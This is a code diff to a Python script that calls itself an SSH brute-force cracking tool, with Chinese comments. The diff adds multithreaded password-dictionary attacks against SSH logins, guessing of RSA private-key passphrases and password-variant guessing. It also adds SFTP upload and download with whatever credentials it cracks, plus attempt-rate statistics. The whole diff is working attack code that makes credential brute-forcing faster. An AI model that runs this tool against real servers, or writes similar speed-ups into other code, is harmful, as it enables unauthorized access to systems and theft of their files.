@@ -1,5 +1,3 @@
-# -*- coding: utf-8 -*-
-
 import paramiko
 import sys
 import smtplib
@@ -15,6 +13,8 @@ from email.mime.text import MIMEText
 from email.header import Header
 from typing import Callable
 import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
 
 # 获取当前时间
 NOWTIME = datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
@@ -76,7 +76,7 @@ def gress_password(old_password: str) -> str:
 # 解析命令行参数
 def parseArgs() -> tuple[str, str , str, int , str , str, str, int]:
     parser = argparse.ArgumentParser(description='SSH Brute-Force Cracking Tool')
-    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans、login、rsa-login")
+    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans、login、rsa-login、guess")
     parser.add_argument('--stmpPath', type=str, default='data.conf', help="邮箱配置文件路径")
     parser.add_argument('--hostname', type=str, default='127.0.0.1', help="目标主机IP地址")
     parser.add_argument('--port', type=int, default=22, help="目标主机SSH端口")
@@ -119,7 +119,7 @@ def TryRsaSSHConnection(hostname: str, SSHport: int, username: str, id_rsa_fileP
     try:
         id_rsa_filePath = id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa'
         local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath, password=Rsa_password)
-        ssh_client.connect(hostname, port=SSHport, username=username, pkey=local_key)
+        ssh_client.connect(hostname, port=SSHport, username=username, pkey=local_key, timeout=5)
         return True , username, Rsa_password
     except Exception:
         return False , username, Rsa_password
@@ -127,22 +127,23 @@ def TryRsaSSHConnection(hostname: str, SSHport: int, username: str, id_rsa_fileP
         ssh_client.close()
 
 # 尝试使用用户名和密码进行SSH连接
-def TrySSHConnection(hostname: str, SSHport: int, username: str, password: str) -> tuple[bool,str,str]:
+def TrySSHConnection(hostname: str, SSHport: int, username: str, password: str) -> tuple[bool, str, str]:
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        print(fr"[!]尝试账号: {username} 密码：{password}")
-        ssh_client.connect(hostname, port=SSHport, username=username, password=password)
-        return True , username, password
+        ssh_client.connect(hostname, port=SSHport, username=username, password=password, timeout=5)
+        print(f"[√] 尝试账号: {username} 密码: {password} 成功")
+        return True, username, password
     except Exception:
-        return False , username, password
+        print(f"[×] 尝试账号: {username} 密码: {password} 失败")
+        return False, username, password
     finally:
         ssh_client.close()
 
 # 尝试使用RSA密钥进行SSH登录
 def TryRsaSSHLogin(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> None:
     if TryRsaSSHConnection(hostname, SSHport, username, id_rsa_filePath, Rsa_password)[0] is True:
-        print(fr"[√]RSA-SSH登录成功! 账号: {username} 私钥密码为：{Rsa_password}")
+        print(f"[√]RSA-SSH登录成功! 账号: {username} 私钥密码为：{Rsa_password}")
         exit(0)
     else:
         print("[×]RSA-SSH登录失败")
@@ -155,19 +156,35 @@ def TrySSHLogin(hostname: str, SSHport: int, username: str, password: str) -> No
         print("[×]SSH登录失败")
 
 # 使用用户名和密码字典进行SSH连接尝试
-def sshClientConnection(hostname:str, SSHport: int):
+def sshClientConnection(hostname: str, SSHport: int):
     if PingIsOpenConnect(hostname, SSHport) is False:
-            Failed("目标主机未开启SSH服务")
+        Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
         user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
         pass_word = f.readlines()
-    for username in user_name:
-        for password in pass_word:
-            if TrySSHConnection(hostname, SSHport, username.strip(), password.strip())[0] is True:
-                Successed(username.strip(), password.strip())
-            else:
-                continue
+    
+    # 使用多线程加快尝试速度，并限制最大并发数
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = []
+        attempt_count = 0
+        start_time = time.time()
+        for username in user_name:
+            for password in pass_word:
+                futures.append(executor.submit(TrySSHConnection, hostname, SSHport, username.strip(), password.strip()))
+        
+        for future in as_completed(futures):
+            result = future.result()
+            attempt_count += 1
+            if result[0] is True:
+                Successed(result[1], result[2])
+        
+        end_time = time.time()
+        duration = end_time - start_time
+        print(f"总尝试次数: {attempt_count}")
+        print(f"总耗时: {duration:.2f} 秒")
+        print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+    
     Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
 
 # 使用RSA密钥和密码字典进行SSH连接尝试
@@ -180,20 +197,48 @@ def sshRsaConnection(hostname: str, SSHport: int):
         pass_word = f.readlines()
     id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
     flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
-    if(flag1 == 'y'):
-        for Rsa_password in pass_word:
-            for username in user_name:
-                if TryRsaSSHConnection(hostname, SSHport, username.strip(), id_rsa_filePath, Rsa_password.strip())[0] is True:
-                    Successed(username.strip(), Rsa_password.strip())
-                    break
-                break
+    if(flag1.lower() == 'y'):
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            attempt_count = 0
+            start_time = time.time()
+            for Rsa_password in pass_word:
+                for username in user_name:
+                    futures.append(executor.submit(TryRsaSSHConnection, hostname, SSHport, username.strip(), id_rsa_filePath, Rsa_password.strip()))
+            
+            for future in as_completed(futures):
+                result = future.result()
+                attempt_count += 1
+                if result[0] is True:
+                    Successed(result[1], result[2])
+            
+            end_time = time.time()
+            duration = end_time - start_time
+            print(f"总尝试次数: {attempt_count}")
+            print(f"总耗时: {duration:.2f} 秒")
+            print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+        
         Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
-    elif(flag1 == 'n'):
-        for username in user_name:
-            if TryRsaSSHConnection(hostname, SSHport, username.strip(), id_rsa_filePath, None)[0] is True:
-                Successed(username.strip(), None)
-                break
-            break
+    elif(flag1.lower() == 'n'):
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            attempt_count = 0
+            start_time = time.time()
+            for username in user_name:
+                futures.append(executor.submit(TryRsaSSHConnection, hostname, SSHport, username.strip(), id_rsa_filePath, None))
+            
+            for future in as_completed(futures):
+                result = future.result()
+                attempt_count += 1
+                if result[0] is True:
+                    Successed(result[1], result[2])
+            
+            end_time = time.time()
+            duration = end_time - start_time
+            print(f"总尝试次数: {attempt_count}")
+            print(f"总耗时: {duration:.2f} 秒")
+            print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+        
         Failed("[x]所有的字典都尝试完毕，没有找到合适的账号。")
     else:
         print("您的输入有误！")
@@ -204,11 +249,12 @@ def sshGuess(hostname: str, SSHport: int, guessNum: int, username: str, password
         Failed("目标主机未开启SSH服务")
     for i in range(guessNum):
         new_password = gress_password(password)
+        print(f"[!] 第{i+1}次猜测密码: {new_password}")
         if TrySSHConnection(hostname, SSHport, username, new_password)[0] is True:
             print(f"[√]猜测成功! 账号: {username} 密码为：{new_password}")
             exit(0)
         else:
-            continue
+            print(f"[×]第{i+1}次猜测失败。")
     Failed("[x]所有的猜测都尝试完毕，没有找到合适的密码。")
 
 # 文件传输功能
@@ -220,51 +266,72 @@ def transFile(hostname: str, SSHport: int):
     with open("password.txt", 'r', encoding='utf-8') as f:
         pass_word = f.readlines()
     flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2。")
-    if(flag2==1):
-        global p,q
-        for username in user_name:
-            for password in pass_word:
-                try:
-                    parameter = (hostname, SSHport)
-                    trans = paramiko.Transport(parameter)
-                    trans.connect(username=username, password=password)
-                    sftp = paramiko.SFTPClient.from_transport(trans)
-                    local_path = input("请输入您要上传的本地文件的绝对路径：")
-                    remote_path = input("请输入您要上传的位置的绝对路径：")
-                    try:
-                        sftp.put(localpath=local_path, remotepath=remote_path)
-                        print("[√]上传成功！")
-                        print(fr"[√]连接成功！账号: {username} 密码为：{password}")
-                        break
-                    except Exception:
-                        print("[×]上传失败。")
-                        continue
-                    finally:
-                        trans.close()
-                except Exception:
-                    pass
-    elif(flag2==2):
-        for username in user_name:
-            for password in pass_word:
-                try:
-                    parameter = (hostname, SSHport)
-                    trans = paramiko.Transport(parameter)
-                    trans.connect(username=username, password=password)
-                    sftp = paramiko.SFTPClient.from_transport(trans)
-                    local_path = input("请输入您要保存的位置的绝对路径：")
-                    remote_path = input("请输入您要获取的文件的绝对路径：")
-                    try:
-                        sftp.get(localpath=local_path, remotepath=remote_path)
-                        print("[√]下载成功！")
-                    except Exception:
-                        print("[×]下载失败。")
-                        continue
-                    finally:
-                        trans.close()
-                except Exception:
-                    pass
+    if(flag2 == '1'):
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            for username in user_name:
+                for password in pass_word:
+                    futures.append(executor.submit(transFileUpload, hostname, SSHport, username.strip(), password.strip()))
+            
+            for future in as_completed(futures):
+                result = future.result()
+                if result is True:
+                    break
+    elif(flag2 == '2'):
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            for username in user_name:
+                for password in pass_word:
+                    futures.append(executor.submit(transFileDownload, hostname, SSHport, username.strip(), password.strip()))
+            
+            for future in as_completed(futures):
+                result = future.result()
+                if result is True:
+                    break
     else:
         print("您的输入有误！")
+
+def transFileUpload(hostname: str, SSHport: int, username: str, password: str) -> bool:
+    try:
+        parameter = (hostname, SSHport)
+        trans = paramiko.Transport(parameter)
+        trans.connect(username=username, password=password)
+        sftp = paramiko.SFTPClient.from_transport(trans)
+        local_path = input("请输入您要上传的本地文件的绝对路径：")
+        remote_path = input("请输入您要上传的位置的绝对路径：")
+        try:
+            sftp.put(localpath=local_path, remotepath=remote_path)
+            print(f"[√] 上传成功! 账号: {username} 密码: {password}")
+            return True
+        except Exception as e:
+            print(f"[×] 上传失败! 账号: {username} 密码: {password} 原因: {e}")
+            return False
+        finally:
+            trans.close()
+    except Exception as e:
+        print(f"[×] 连接失败! 账号: {username} 密码: {password} 原因: {e}")
+        return False
+
+def transFileDownload(hostname: str, SSHport: int, username: str, password: str) -> bool:
+    try:
+        parameter = (hostname, SSHport)
+        trans = paramiko.Transport(parameter)
+        trans.connect(username=username, password=password)
+        sftp = paramiko.SFTPClient.from_transport(trans)
+        local_path = input("请输入您要保存的位置的绝对路径：")
+        remote_path = input("请输入您要获取的文件的绝对路径：")
+        try:
+            sftp.get(localpath=local_path, remotepath=remote_path)
+            print(f"[√] 下载成功! 账号: {username} 密码: {password}")
+            return True
+        except Exception as e:
+            print(f"[×] 下载失败! 账号: {username} 密码: {password} 原因: {e}")
+            return False
+        finally:
+            trans.close()
+    except Exception as e:
+        print(f"[×] 连接失败! 账号: {username} 密码: {password} 原因: {e}")
+        return False
 
 # 发送邮件通知
 def send_msg(stmpPath: str):
@@ -321,7 +388,7 @@ if __name__ == '__main__':
     }
 
     # 解析命令行参数
-    mode, stmpPath, hostname, SSHport, username, password, rsa_password, guessNum= parseArgs()
+    mode, stmpPath, hostname, SSHport, username, password, rsa_password, guessNum = parseArgs()
     print(f"[DEBUG] 模式：{mode}，目标主机：{hostname}, SSH端口: {SSHport}")
     
     # 检查模式是否存在
